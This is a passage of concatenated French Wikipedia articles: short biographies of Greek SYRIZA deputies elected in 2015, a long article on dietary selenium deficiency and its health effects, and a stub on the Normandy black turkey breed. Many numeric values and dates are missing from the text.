Aux élections législatives grecques de janvier 2015, il est élu député au Parlement hellénique sur la liste de la SYRIZA dans la circonscription de la Phthiotide.
Le , il quitte la SYRIZA avec vingt-quatre autres députés dissidents pour créer Unité populaire.

</doc>
<doc id="9413231" url="https://fr.wikipedia.org/wiki?curid=9413231" title="Vassilikí Léva">
Vassilikí Léva

Vassilikí Léva (en grec ) est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Phthiotide.

</doc>
<doc id="9413234" url="https://fr.wikipedia.org/wiki?curid=9413234" title="Dimítrios Véttas">
Dimítrios Véttas

Dimítrios Véttas (en grec ) est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Phthiotide.

</doc>
<doc id="9413237" url="https://fr.wikipedia.org/wiki?curid=9413237" title="Carence alimentaire en sélénium">
Carence alimentaire en sélénium

La carence alimentaire en sélénium est un manque dans le corps de l'oligo-élément essentiel qu'est le sélénium.
Les personnes les plus menacées par une carence en sélénium sont en particulier celles qui vivent dans des régions au sol particulièrement pauvre en sélénium, et les personnes qu'il faut alimenter sur une longue durée artificiellement, par voie parentérale.
La carence en sélénium provoque une diminution des fonctions d'enzymes dépendant du sélénium, qui apparaissent dans presque tous les organes. Elle peut donc causer des perturbations de divers systèmes organiques. Par exemple, les enzymes du groupe des glutathion peroxydases, qui jouent un grand rôle dans le contrôle du stress oxydant, ainsi que certaines désiodases (enzymes capturant l'iode), importantes pour l'action des hormones thyroïdiennes sur les cellules du corps, contiennent du sélénium, et dépendent donc de sa disponibilité pour être formées.
Ce n'est que dans la seconde moitié du que l'importance du sélénium pour les processus métaboliques de l'homme a été mise en évidence, et tout d'abord de façon préliminaire. La première maladie pour laquelle il a été démontré sans nul doute qu'elle est causée par une carence en sélénium est la maladie de Keshan. C'est une maladie du myocarde, où de plus la présence de certains virus joue un rôle important. La maladie de Keshan peut être évitée à titre préventif ou curatif par l'administration de sélénium. D'autres maladies indiscutablement provoquées par la carence en sélénium peuvent être atténuées par l'administration de sélénium.
Les résultats scientifiques sur les conséquences de la carence en sélénium pour de nombreux systèmes d'organes sont encore partiellement contradictoires. Certaines maladies, pour lesquelles une carence en sélénium n'a (pour l'instant) pas été mise en évidence, répondent cependant à l'administration de sélénium. Mais il n'y a pas de recommandation consensuelle pour cette administration dans le traitement de ces maladies. De même, les indications sur les doses de sélénium que devraient absorber journellement des individus sains sont variables.
L'opposé de la carence en sélénium — l'excès de sélénium — est désigné par sélénose.
Les bases.
Le sélénium pénètre dans la chaîne alimentaire en étant assimilé dans le sol par des plantes, sous forme minérale et transformé par elles en composés organiques. La concentration en sélénium des plantes dépend ainsi non seulement de sa concentration dans le sol (les sols pauvres en sélénium sont les sols acides ou d'origine volcanique), mais est aussi influencée de manière négative par la présence simultanée d'autres éléments (tels que soufre, aluminium ou fer).
Métabolisme du sélénium chez l'homme.
On trouve du sélénium dans tous les tissus — la quantité totale moyenne étant de : environ 60 % dans les reins, le foie et les muscles, ainsi que 30 % autres dans le squelette. On ne connaît pas jusqu'à présent la quantité optimale de sélénium à fournir au corps humain pour son approvisionnement en oligo-élément essentiel.
Absorption et besoins.
L'absorption du sélénium par le tube digestif dépend de sa valence dans le composé chimique par lequel il est apporté, et non de l'état de ce dernier. Le taux d'absorption se situe entre . Il est particulièrement haut pour le sélénite de sodium (Na2SeO3) et un peu moins pour la sélénométhionine (C4H9NO2Se) ou la sélénocystéine (C3H7NO2Se). Les sociétés pour l'alimentation recommandent en Allemagne (DGE, Société allemande pour la nutrition), en Suisse (SGE/SVE), et en Autriche (ÖGE) de (jusqu'à au plus). Aux États-Unis, on recommande pour les femmes et pour les hommes, et entre pour les enfants, en fonction du poids et de l'âge. Pour ces recommandations, il s'agit de valeurs estimées, fondées sur l'activité d'une enzyme nécessitant absolument du sélénium (la glutathion peroxydase). L'activité de cette enzyme dans le sérum sanguin (GPX 3) atteint sa valeur maximale quand l'apport journalier est de par kg de masse corporelle, tandis que la concentration optimale de la protéine de transport sélénoprotéine P dans le sérum n'est atteinte que pour un apport bien plus élevé. Il est sûr que des symptômes de carence apparaissent pour une longue période d'apports inférieurs à /j, ainsi que des signes d'empoisonnement (sélénose) pour des apports au-dessus de .
Les aliments riches en sélénium sont la viande, les tripes (les reins pour /, le foie pour /), le poisson, les fruits de mer, le lait (/), le fromage (/), les œufs (/), les champignons, les produits à base de céréales (/) et les légumineuses. Environ 28 % de l'apport en sélénium provient de la viande, en particulier de la viande de porc ; environ 16 % des œufs. Les régions avec un contenu particulièrement faible en sélénium dans le sol sont des parties de la Scandinavie, de la Chine et de la Nouvelle-Zélande. La diète japonaise traditionnelle avec beaucoup de poisson et de riz est considérée comme riche en sélénium. Les noix d’Amazonie ont un contenu en sélénium particulièrement élevé (les données varient entre /), et le sélénium y possède une disponibilité biologique considérable.
L'estimation de la situation d'approvisionnement en Allemagne n'est pas présentée de façon univoque dans la littérature, elle va de « zone de carence » à « assurée ». Il y a des indications sur le fait qu'environ 70 % de la population en Allemagne n'absorbe pas assez de sélénium (avec une médiane de /j). Selon une autre source, la prise médiane en Allemagne serait pour les hommes de /j et pour les femmes de /j. Aux États-Unis, elle serait entre .
Transport.
Dans le sang, le sélénium est transporté fixé à des protéines du plasma. Par cette voie, il arrive à tous les tissus (y compris les cheveux et les os). Plus de 60 % du sélénium est lié à la glycoprotéine sérique sélénoprotéine P (dans de bonnes conditions d'alimentation, jusqu'à 10 atomes par molécule).
Stockage.
Le sélénium est stocké dans le corps sous forme de sélénométhionine, et de là, mobilisé selon les besoins. Par contre, c'est la sélénocystéine qui est biologiquement active. On ne trouve pas de sélénium non lié dans le corps. La protéine de transport sélénoprotéine P semble aussi avoir une importance notable pour le stockage.
Excrétion.
L'excrétion du sélénium dépend de l'état du corps pour le sélénium, elle a lieu plus rapidement en cas de suralimentation. Le sélénium est éliminé en premier lieu par l'urine, mais aussi par les fèces. En particulier en cas de prise abondante, il est en plus éliminé sous forme de séléniure de diméthyle (CH3)2Se par la respiration, ce qui donne à l'haleine une odeur alliacée.
Physiologie.
Dans les protéines du corps humain, le sélénium est exclusivement sous forme de sélénocystéine. Ces protéines sont alors désignées par « sélénoprotéines ». La sélénocystéine, dans des conditions de bonne santé, est sous forme ionisée, et apparaît plus efficace comme catalyseur rédox, notablement plus que la cystéine, qui contient du soufre au lieu de sélénium. Dans le cadre du repliement des protéines, elle se trouve dans le centre actif de la sélénoprotéine concernée. Dans le génome humain, 25 gènes contiennent l'information génétique pour environ 30 à 50 sélénoprotéines (techniquement, ils les codent). Dans bien des cas, plusieurs gènes codent une protéine. La fonction de 15 de ces protéines est connue au moins en partie. De façon systématique, les sélénoprotéines chez l'homme sont réparties en 17 groupes différents. À côté des glutathion-peroxydases (codées par 5 gènes), on compte les thiorédoxines réductases (3 gènes), les désiodases (3 gènes) et les sélénophosphates-synthétases. Les autres protéines sont désignées par ordre alphabétique par sélénoprotéine 15, SelH, SelI, SelK, SelM, SelN, SelO, SelP, SelR, SelS, SelT, SelV et SelW.
La formation des sélénoprotéines est un processus intracellulaire complexe, qui diffère fondamentalement de la biosynthèse des autres protéines. En utilisant la guanosine triphosphate, le codon-stop UGA de l'ARN messager sert de signal pour l'incorporation de sélénium. Pour ce processus, il doit y avoir trois éléments particuliers, qui sont d'ailleurs différents entre les procaryotes et les eucaryotes. Chez ces derniers, ce sont :
Glutathion peroxydases.
Les glutathion peroxydases "(GPX 1–7)" contribuent à la diminution des dommages oxydatifs aux cellules et aux tissus, en détoxifiant les lipides saturés et insaturés des membranes cellulaires. Parmi les 7 formes connues chez l'homme, 5 dépendent du sélénium (GPX 1–4 und 6).
Le GPX 1, connu notamment par le métabolisme des érythrocytes peut être trouvé dans le cytosol de la plupart des corps cellulaires. D'autres glutathion peroxydases se trouvent par exemple dans les cellules du tube digestif (GPX 2), dans le plasma sanguin (GPX 3), à la surface des membranes de diverses cellules ainsi que dans le noyau des spermatozoïdes (GPX 4), dans les cellules olfactives (GPX 6).
La fonction fondamentale des glutathion peroxydases est de réduire le peroxyde d'hydrogène () en eau (H2O). Cette réaction se fait avec oxydation de glutathion.
Les peroxydes existant dans les tissus du corps libèrent des radicaux d'ion hydroxyde H−O, qui conduisent à des dommages pour les cellules et les tissus. Cette réaction joue un rôle significatif dans le vieillissement des cellules et les agressions du foie (par l'alcool et les composés organochlorés). La réduction des peroxydes par les glutathions peroxydases est donc un mécanisme de protection antioxydatif. Il est en outre utile pour préserver l'intégrité des globules rouges, en protégeant les lipides de leur membrane de la peroxydation.
Désiodases.
Les désiodases sont des enzymes dépendantes du sélénium, importantes pour le métabolisme des hormones thyroïdiennes. Actuellement, on en connaît trois formes différentes (DIO 1-3). Leur fonction est la désiodisation (élimination d'atomes d'iode) des hormones thyroïdiennes, qui les active (thyroxine transformée en triiodothyronine) ou les désactive (triiodothyronine en diiodotyrosine). La désiodase de la thyroxine 5' de type 1 apparaît principalement dans le foie, les reins et la musculature. Les autres désiodases se trouvent par exemple dans le système nerveux central et dans les tissus fœtaux. Le processus de commande à la base de la formation des désiodases, et auquel participent aussi la triiodothyronine et la thyréostimuline (TSH), est encore très mal connu. Par manque de sélénium, ces enzymes sont formées préférentiellement dans de nombreux tissus (par exemple le système nerveux central).
Thiorédoxine réductases.
Les thiorédoxine réductases sont des protéines qui jouent un rôle important dans le métabolisme cellulaire. Elles y jouent un rôle de catalyseur dans les réactions d"'échange thiol-disulfure" et sont importantes pour le repliement des protéines (formation de ponts disulfures) ainsi que pour l'enzyme ribonucléotide réductase nécessaire à la mitose. Elles apparaissent aussi bien dans le cytosol que dans le noyau cellulaire, neutralisent des espèces acides réactives, régulent les processus sensibles à l'oxydoréduction, et activent des facteurs de transcription.
Causes de la carence en sélénium.
Un apport pauvre ou extrêmement déséquilibré, mais aussi des troubles de la digestion ou des médicaments, peuvent être la cause d'un manque de sélénium. Les personnes en danger sont donc non seulement celles qui vivent dans des régions pauvres en sélénium, et les patients qui ont besoin d'une alimentation par voie parentérale. L'apport en sélénium des végétariens peut être considéré comme assuré, et se situe environ au même niveau que celui des personnes qui se nourrissent d'aliments mélangés. La cause peut en être des taux d'absorption digestive différents. Dans les régimes végétaliens, l'apport de sélénium est assuré par les noix et les graines.
Selon les résultats d'une conférence de consensus de 1997, les circonstances suivantes provoquent un haut risque de carence en sélénium à cause d'un apport diminué : nourriture extrêmement déséquilibrée (par exemple alcoolisme, nourriture par sonde ou par voie parentérale, dialyse, famine, anorexie mentale ou boulimie. Un risque de carence en sélénium causée par des pertes excessives existe en cas de diarrhée de longue durée, une mauvaise digestion (certaines perturbations digestives), abus des laxatifs, protéinurie dans certaines maladies des reins, syndrome néphrotique, bilan azoté négatif, diabète insipide, traitement aux diurétiques, fortes hémorragies (p. ex. hémorroïdes ou fortes menstruations), allaitement de longue durée, fortes brûlures ou autres traumatismes.
Pathophysiologie.
En cas de carence en sélénium, les enzymes dépendant du sélénium sont formées en moins grande quantité.
Des perturbations des enzymes dépendant du sélénium peuvent aussi se produire en cas de maladie génétique. Dans ces cas, même en cas d'apport suffisant de cet élément trace essentiel, l'activité des enzymes concernées est sensiblement diminuée. Ce genre de maladie génétique « imite » une carence en sélénium. Dans le cadre de la recherche fondamentale clinique, cette situation est utilisée pour mieux comprendre l'importance du sélénium dans la manifestation de symptômes morbides.
Il y a des indications qu'en cas de carence en sélénium, le cerveau, les glandes endocrines et les gonades sont approvisionnées de préférence. En outre, il semble qu'en période de carence en sélénium, le corps change la répartition de glutathion peroxydase 1 (GPX 1) et de désiodase 1 (Thyroxine-5' désiodase). Dans le cadre d'inflammations ou de maladies infectieuses, il y a un changement de distribution du sélénium du sang vers d'autres régions du corps (par exemple la musculature). La cause, l'importance et les conséquences de ce phénomène ne sont actuellement pas encore clarifiées.
Les glutathion peroxydases semblent être responsables de la défense contre les maladies de façon différente selon leur type. C'est ainsi que l'on a pu mettre en évidence par des expériences sur des animaux par exemple, que GPX 1 est importante pour la défense contre les virus et pour empêcher la survenue de tumeurs malignes, que la carence en GPX 2 conduit à des infections bactériennes plus nombreuses et à des altérations malignes en particulier dans le tube digestif ainsi qu'à un ralentissement de la croissance, et GPX 4 joue un rôle important dans la spermatogenèse. Des altérations des désiodases ont des conséquences sur le métabolisme des hormones thyroïdiennes et ainsi aussi sur la régulation de la température, la croissance, l'ouïe, et surtout aussi le développement du cerveau chez le fœtus.
Tableau clinique.
La carence en sélénium peut toucher divers systèmes du corps de façon différente. À la base, et en dernière analyse, on trouve des fonctions diminuées pour diverses enzymes dépendant du sélénium et leurs conséquences. L'influence souvent discutée de enzymes dépendant du sélénium sur la survenue de tumeurs malignes dépend de nombreux autres facteurs et n'est jusqu'à présent pas entièrement comprise.
Des découvertes typiques sont des modifications des ongles, une desquamation de la peau, de l'anémie, une diminution de la qualité du sperme, des maladies de foie, des perturbations de la croissance et de l'ossification, ainsi que des perturbations fonctionnelles douloureuses et des maladies structurelles des muscles (myopathies). Ces dernières, dans bien des cas, altèrent la capacité des patients à marcher. Si la musculature du cœur est concernée (cardiomyopathie ou dégénérescence du muscle cardiaque), des perturbations de la fréquence cardiaque ou une insuffisance cardiaque peuvent survenir. Chez les enfants et les jeunes, la carence chronique en sélénium peut faire craindre en outre des maladies des os, des cartilages et des articulations, ainsi que le nanisme (maladie de Kashin-Beck). Une carence latente ne peut pas être diagnostiquée uniquement à l'aide de signes cliniques.
Chez les mammifères, la carence en sélénium peut conduire aussi bien à des nécroses du foie qu'à une survenue importante de cancer du foie. Ensuite, elle peut altérer la maturation des spermatozoïdes, et ainsi conduire à la stérilité. En outre, la carence en glutathion peroxydases dans le cristallin est rendue responsable de survenue plus fréquente de la cataracte.
Musculature cardiaque et squelettique.
Le mécanisme des atteintes à la musculature cardiaque et squelettique par manque de sélénium n'est pas encore clarifié, mais les muscles présentent (chez l'homme et l'animal) une pâleur caractéristique. Dans des expériences sur animaux, avec alimentation essentiellement sans sélénium, mais administration suffisante de toutes les autres fractions essentielles de l'alimentation, il a été noté des augmentations de l'activité enzymatique de l'aspartate aminotransférase et de la créatine kinase symptomatiques de dommages aux muscles. On peut aussi démontrer des augmentations correspondantes de l'activité chez l'homme en cas de carence en sélénium.
Chez les hommes atteints de troubles musculaires par carence en sélénium par troubles digestifs ou alimentation parentérale, on a pu atteindre une amélioration seulement par administration de sélénium. Mais inversement comme les patients atteints de ces formes de carence en sélénium provoquées par l'alimentation ne souffrent pas tous de troubles musculaires, il faut conclure que d'autres facteurs (p.ex. infections virales) y prennent part par ailleurs. Les maladies musculaires où la carence en sélénium semble la (une) cause sont connues en médecine vétérinaire chez les ruminants, les porcs et les dindons. On les connaît sous les noms de "maladie des muscles blancs", "dystrophie musculaire nutritive" ou "dystrophie musculaire enzootique".
Comme cause pour les dommages musculaires, on discute de la diminution de la sélénoprotéine N qui dépend du sélénium. Des mutations du gène codant la sélénoprotéine N, SEPN1, sont décrites en rapport avec une série de myopathies innées, la plupart du temps héréditaires et autosomiques récessives, apparaissant en partie aussi avec une cardiomyopathie héréditaire. On y compte la myopathie congénitale à multicores, la myopathie congénitale à cores centraux (RSMD1), et la myopathie reliée à la "desmine avec inclusions" semblables à des "corps de Mallory".
La sélénoprotéine N se trouve dans le réticulum endoplasmique, sa fonction est inconnue. Des maladies du système nerveux provoquées par la carence en sélénium peuvent être la cause de dommages musculaires. On trouve aussi dans la musculature de la sélénoprotéine P, dont on suppose de même qu'elle peut être (co-)responsable pour des maladies musculaires survenant lors de carence en sélénium.
Maladie de Keshan.
La maladie classiquement attribuée à la carence en sélénium est désignée par maladie de Keshan. Elle survient pour un apport journalier inférieur à (taux de sélénium dans le sérum sanguin inférieur à 20 μg/l) et se traduit typiquement par une insuffisance cardiaque causée par une cardiomyopathie de dilatation. La cause des perturbations de la fréquence cardiaque et de l'insuffisance cardiaque est que des parties du myocarde se nécrosent et meurent. Les altérations du cœur ressemblent du point de vue histologique à celles de l'ataxie de Friedreich.
Cette maladie a été observée avant tout chez les enfants et les femmes vivant dans les régions de Chine où l'apport de sélénium dans la nourriture est particulièrement faible. Le nom est tiré du district de Keshan, pauvre en sélénium, dans la province chinoise de Heilongjiang.
On a supposé que les dommages aux membranes cellulaires proviennent d'une activité diminuée des enzymes séléniées antioxydantes. Mais en particulier, des expériences sur des animaux indiquent qu'un lien entre carence en sélénium et infection par un virus de Coxsackie, d'une part, et inflammation du myocarde et développement d'une cardiomyopathie dilatative (caractéristiques de la maladie de Keshan), d'autre part, la carence en sélénium étant la cause possible d'un mécanisme de défense altéré. Une autre cause supposée, connue grâce à des expériences sur animaux, est la diminution de la fonction de thiorédoxine réductases (TrxR2).
La thérapie de substitution du sélénium empêche la progression des maladies, mais ne provoque pas la régression d'une maladie déjà déclarée. L'apport de compléments nutritifs au sélénium pour les personnes vivant dans des zones correspondantes pourrait complètement éradiquer la maladie de Keshan.
Maladie coronarienne.
Une diminution de l'activité de la glutathion peroxydase (GPX 3) dans le sérum, qui arrive typiquement par carence en sélénium, est considérée comme un facteur de risque pour les maladies coronariennes. De bas taux du sélénium dans le sang ont une corrélation statistique avec une fréquence accrue de maladie coronarienne ; les données à ce sujet ne sont pas uniformes, si bien que l'on ne peut pas actuellement recommander de mesures préventives au moyen de médicaments contenant du sélénium.
Thyroïde.
Dans la thyroïde se trouve une quantité particulièrement grande de sélénium. Il a une importance particulière pour la thyroïde, ses atteintes et maladies. Une survenue commune de carence en sélénium et en iode peut renforcer l'expression du crétinisme myxœdémateux.
Désiodases.
Les désiodases sont des enzymes dépendant du sélénium donc la fonction cliniquement la plus évidente est la transformation de l'hormone thyroïdienne thyroxine (T4) dans la triiodothyronine (T3) dix fois plus efficace. C'est pourquoi une carence en sélénium contribue à une formation diminuée de T3, et ainsi à l'apparition d'une hypothyroïdie.
La recherche médicale fondamentale a montré qu'une mutation du gène provoquant une diminution de la quantité ou de la fonctionnalité de la protéine dépendant du sélénium, l"'élément SECIS 2" (SBP2 — responsable pour la traduction des sélénoprotéines) peut aussi susciter une diminution correspondante des désiodases.
Autoanticorps.
L'administration de sélénium empêche la formation d'autoanticorps contre la thyroperoxydase. Il y a des indications vers une survenue plus fréquente de goitre dû à la carence en iode, ou la thyroïdite de Hashimoto (maladie autoimmune de la thyroïde) en cas de carence en sélénium.
Stress oxydant.
Dans le cadre de la production d'hormones thyroïdiennes dans les cellules épithéliales des follicules thyroïdiens, il se fabrique de grandes quantités de radicaux oxygénés et de peroxydes (stress oxydant), qui sont dans des conditions normales, capturés par des peroxydases contenant du sélénium. En cas de carence en sélénium, la concentration de ces enzymes est diminuée, cela provoque des dommages aux cellules et la fréquence des cancers de la thyroïde augmente. Chez les enfants, de tels cas peuvent conduire à une atrophie de la thyroïde.
On discute en outre pour savoir si une carence en sélénium supplémentaire ne favorise pas la charge en radicaux par carence en iode, et par là l'autonomie de la thyroïde. Celle-ci est une mise hors fonction du système de régulation du système hormonal thyroïdien. Celui-ci vise à établir une quantité optimale d'hormones thyroïdiennes dans le sang :
Autres systèmes d'organes et fonctions du corps.
Croissance.
À côté de l'influence décrite ci-dessus sur les hormones thyroïdiennes, la carence en sélénium contribue aussi à une faiblesse de la musculature. Dans des expériences sur animaux, cette carence a conduit à un déficit de croissance et à une prise de nourriture diminuée.
La carence en sélénium est considérée comme une cause importante de maladies des os, des cartilages et des articulations (désignées techniquement par "ostéoarthropathies" ou "ostéochondropathies"), qui surviennent dans ces cas souvent en connexion avec un retard de croissance. Ce tableau clinique est désigné par maladie de Kashin-Beck, et se distingue en particulier par des articulations déformées aux extrémités. Mais on discute pour savoir si cette maladie ne suppose pas la responsabilité conjointe d'une disposition génétique ou d'une infection virale (virus coxsackie A).
Système nerveux.
Il y a des indications qu'à côté d'une série de maladies musculaires, il peut survenir des atteintes nerveuses dues à la carence en sélénium. Des expérimentations animales montrent que cette carence ne conduit pas directement à des dommages, mais rend le cerveau plus sensible vis-à-vis des neurotoxines, et provoque plus d'ischémies. La responsabilité en revient à l'activité réduite de la glutathion peroxydase 1 (GPX 1) par carence en sélénium. Les perturbations des désiodases influencent le métabolisme des hormones thyroïdiennes et donc le développement du cerveau dès la phase embryonnaire.
Reproduction.
Les enzymes dépendant du sélénium ont une importance essentielle pour la production des spermatozoïdes. En outre, il y a des indications que la carence en sélénium provoque une diminution de la mobilité des spermatozoïdes.
Une altération génétiquement conditionnée de l'enzyme glutathion peroxydase 4 (GPX 4), dépendant du sélénium, conduit à une diminution de la fertilité masculine et une qualité diminuée du sperme.
Système immunitaire.
Le sélénium possède une action modulant l'immunité et il y a des indications que la carence en sélénium altère le système immunitaire. Un apport supplémentaire de /j de sélénium a conduit dans le cadre d'une infection virale expérimentale à une augmentation des cytokines et à une multiplication des lymphocytes NK.
L'expérimentation animale indique que la réponse immunitaire cellulaire (par exemple contre le cryptosporidium parvum) est affaiblie et certains virus, sans doute en raison de cette faiblesse de la défense, augmentent en virulence. Cette circonstance peut être (en partie) source de maladies (par exemple du cœur).
Des études épidémiologiques ont montré un rapport entre carence en sélénium et survenue augmentée de cancers : prostate, côlon, sein, ovaire et poumon. Chez les animaux, mais pas chez l'homme, l'incidence des cancers peut être réduite par un enrichissement de la nourriture en sélénium. Parmi les causes possibles, on discute d'une diminution de l'effet antioxydant des glutathion peroxydases, une défense insuffisante contre les états précancéreux, ou une modification des mécanismes de réparation de l'ADN.
Foie.
La carence en sélénium favorise la survenance d'une nécrose du foie. L'expérimentation animale a pu démontrer que la carence en sélénium peut être une cause possible dans ce cas par diminution de l'activité des glutathion peroxydases. Dès les années 1950, les expérimentations animales établissent le fait que l'administration de sélénium (alors dénommé « facteur 3 ») peut empêcher la mort des cellules dans ces conditions d'alimentation. Une autre indication sur l'effet protecteur du sélénium est fourné par la diminution de la fréquence de survenue d'une certaine forme de cancer du foie dans les régions de carence extrême en sélénium de Chine. On considère que la cause de la survenue de ce cancer y est l'hépatite B, très répandue dans ces régions, et simultanément le haut contenu en aflatoxines de l'alimentation.
Sang.
La carence en sélénium peut être considéré comme un facteur autonome pour la survenue d'une anémie, chez l'homme comme chez l'animal. On peut considérer comme cause possible la diminution de la glutathion peroxydase 1 (GPX 1) dans les globules rouges, parce qu'il y a des indications que l'administration de sélénium protège ces cellules du sang de la destruction par le stress oxydant. Une autre cause possible, connue par l'expérimentation animale, est une diminution de la fonction de la thiorédoxine réductase (TrxR2), dépendante du sélénium, ce qui gêne la production des globules.
Méthodes de recherche.
Des indications appropriées et pertinentes sur le contenu en sélénium du corps viennent du taux de sélénium sanguin (dans le plasma ou dans l'hémoglobine des érythrocytes). Une valeur repère fiable pour quantifier l'apport instantané est donnée par le dosage de la sélénoprotéine P dans le sang, mais pour la situation à plus long terme, c'est le contenu dans les ongles ou les cheveux.
Les enzymes dépendant du sélénium sont formées en plus faible quantité en cas de carence en sélénium. Cela se reconnaît à une activité enzymatique diminuée de façon mesurable, et donc une preuve indirecte appropriée est aussi l'activité des glutathion peroxydases dans le plasma sanguin ou les érythrocytes.
Le taux de sélénium sanguin en Allemagne se situe environ entre et aux États-Unis entre . Pour des valeurs inférieures à /ℓ, on peut observer des limitations des fonctions enzymatiques (glutathion peroxydases). Pour obtenir cette valeur limite, il faut une prise de /j de sélénium par kg de poids corporel. Pour atteindre la valeur optimale d'activité de glutathion peroxydase (GPX 3) dans le sérum, il faut cependant atteindre un apport quotidien de de sélénium par kg de poids corporel. Pour l'interprétation, il faut faire attention à ce que l'activité de la glutathion peroxydase GPX 3 dans le plasma dépend du fonctionnement des reins et du contenu en sélénium des tubules rénaux. Elle atteint rapidement, dès un apport en sélénium devenu bon, une valeur normale. Les paramètres correspondants à partir des érythrocytes (temps de vie environ de 3 mois), montrent la situation moyenne des apports pendant environ 90 jours avant le dosage.
Thérapeutique.
Pour le traitement des maladies dues à la carence en sélénium il faut d'une part, remédier aux causes en apportant suffisamment de sélénium, mais aussi on indique des mesures symptomatiques pour le traitement des conséquences.
Prévention.
Le but des mesures préventives est d'assurer un apport journalier suffisant de sélénium dans l'alimentation. Dans les régions pauvres en sélénium, l'enrichissement des engrais est aussi approprié. Par exemple, en Finlande, où les sols et les eaux de boisson ne contiennent que peu de sélénium, on a incorporé du sélénate de sodium aux engrais artificiels, ce qui a permis un apport amélioré de cet élément trace essentiel à la population. Le contenu de sélénium dans le lait dépend directement de sa proportion dans le fourrage animal utilisé. C'est ce rapport que l'on a justement utilisé en Finlande, mais aussi en Suède, pour améliorer l'apport à la population.
Substitution du sélénium.
Les seules indications certaines jusqu'à présent pour l'utilisation de préparation contenant du sélénium sont une carence manifeste en sélénium, et la maladie de peau dermite séborrhéique, en applications locales. L'utilisation pour la thyroïdite de Hashimoto ou la prévention du cancer est sujette à caution (voir ci-dessus). L'administration journalière de de sélénium est recommandée comme thérapie adjuvante simple et économique pour l'infection à VIH, car les effets positifs sur la charge virale et les lymphocytes T auxiliaires ont été démontrés. Un surdosage d'aliments ou de médicaments contenant du sélénium peut conduire à la sélénose.
Cancer.
On ne peut pas donner de recommandation générale pour les compléments alimentaires contenant du sélénium pour prévenir les cancers:
Thyroïdite autoimmune.
On a pu montrer que pour une large majorité de patients atteints de thyroïdite de Hashimoto, une maladie autoimmune de la thyroïde, l'apport quotidien de de sélénium conduit à une diminution notable des anticorps anti-thyroperoxydase (anti-TPO) et à une normalisation de l'image échographique. Pour les patients atteints de thyroïdite de Hashimoto, on recommande donc une administration journalière accrue de sélénium (enfants : , jeunes : , adultes : ), mais d'autres sources considèrent le statut des recherches comme insuffisant pour recommander l'administration de sélénium. En tout, on n'a pas pu montrer que le processus autoimmun à la base de la thyroïdite de Hashimoto entre en rémission, ou qu'une diminution de la fonction thyroïdienne (hypothyroïdie) puisse être finalement empêchée. Ce n'est que chez les patients avec un niveau d'anticorps très élevé que l'on peut montrer un effet, et aucun chez les enfants et les jeunes. Dans une étude, on a rapporté l'effet positif d'une thérapie au sélénium pour une orbitopathie endocrine. En résumé, Grünwald et Derwahl viennent à la conclusion que dans la thyroïdite de Hashimoto, l'action de la thérapeutique au sélénium n'a pas d'action scientifiquement prouvée sur le processus immun ni sur la perte de fonction de la thyroïde. Il s'ébauche donc une attitude circonspecte face à la thérapie au sélénium.
Chez des femmes enceintes positives pour les anticorps anti-thyroperoxydase l'administration de sélénium a pu diminuer significativement la thyroïdite du post-partum et l'hypothyroïdie. Il est donc recommandé aux enceintes fortement positives pour les anticorps anti-thyroperoxydase, il est souvent recommandé des compléments alimentaires au sélénium. Pour le traitement d'un crétinisme consécutif à une carence combinée en iode et en sélénium, il faut faire attention à ce que le sélénium ne soit administré que quand le niveau d'iode est rétabli à la normale. Sinon, la reprise de l'activité des désiodases conduit à une nouvelle perte d'iode à partir de la thyroïde endommagée.
Aspects historiques.
La découverte du sélénium comme élément chimique remonte à Jöns Jacob Berzelius en 1817. Klaus Schwarz et Calvin M. Foltz trouvent en 1957 que le sélénium est un élément-trace essentiel. Ils ont montré sa fonction protectrice contre une certaine forme de maladie du foie (nécrose hépatique K71.1). Les premières protéines contenant du sélénium ont été découvertes en 1973 chez des unicellulaires et classées en glutathion peroxydases. En 1990 on a réussi à démontrer que la désiodase la plus importante pour la fonction des hormones thyroïdiennes (le type 1), dépend du sélénium. Jusqu'en 2006, trois gènes ont pu être décrits pour les isoenzymes correspondantes.
La maladie de Keshan a été décrite pour la première fois en 1935. En 1964, sa survenance fréquente en corrélation avec une maladie musculaire des animaux (maladie des muscles blancs) a été remarquée. En 1965, un médecin de campagne de la province du Shanxi, dont le nom est tombé dans l'oubli, soigne une maladie du cœur pour la première fois avec du sélénite de sodium. Peu après, l'Académie chinoise des sciences médicales confirme le rapport entre carence en sélénium et maladie de Keshan. Entre 1974 et 1977, une étude prospective sur les enfants dans les districts endémiques de la province du Sichuan a été conduite, pour documenter la diminution de la morbidité et de la mortalité, ainsi que d'une amélioration de son évolution clinique.
En 1979, Andre M. van Rij, dans son étude de cas sur des patients alimentés artificiellement par nutrition parentérale pauvre en sélénium, constate la survenue d'une dystrophie musculaire, clairement diminuée par apport de sélénium.

</doc>
<doc id="9413238" url="https://fr.wikipedia.org/wiki?curid=9413238" title="Elissávet Skoúfa">
Elissávet Skoúfa

Elissávet « Bétty » Skoúfa (en grec ), née le , est une femme politique grecque.
Biographie.
Aux élections législatives grecques de janvier 2015, elle est élue députée au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Piérie.

</doc>
<doc id="9413240" url="https://fr.wikipedia.org/wiki?curid=9413240" title="Carence en sélénium">
Carence en sélénium



</doc>
<doc id="9413244" url="https://fr.wikipedia.org/wiki?curid=9413244" title="War Pigs (film)">
War Pigs (film)



</doc>
<doc id="9413252" url="https://fr.wikipedia.org/wiki?curid=9413252" title="Charílaos Tzamaklís">
Charílaos Tzamaklís

Charílaos Tzamaklís (en grec ), né le à Kateríni en Grèce, est un homme politique grec.
Biographie.
Aux élections législatives grecques de janvier 2015, il est élu député au Parlement grec sur la liste de la SYRIZA dans la circonscription de la Piérie.

</doc>
<doc id="9413260" url="https://fr.wikipedia.org/wiki?curid=9413260" title="Dindon noir de Normandie">
Dindon noir de Normandie

Le dindon noir de Normandie ou Noir de Normandie est une race de dindon français à faible effectif issue de la variété dindon noir de Sologne.
Description.
Le dindon noir de Normandie est plus petit que le dindon noir de Sologne (appelé aussi , autrefois race la plus répandue de dindon en France) avec des tarses noirs (qui ont tendance à rougir avec l'âge) et plus courts ; il possède aussi des caroncules plus développées que le noir de Sologne.
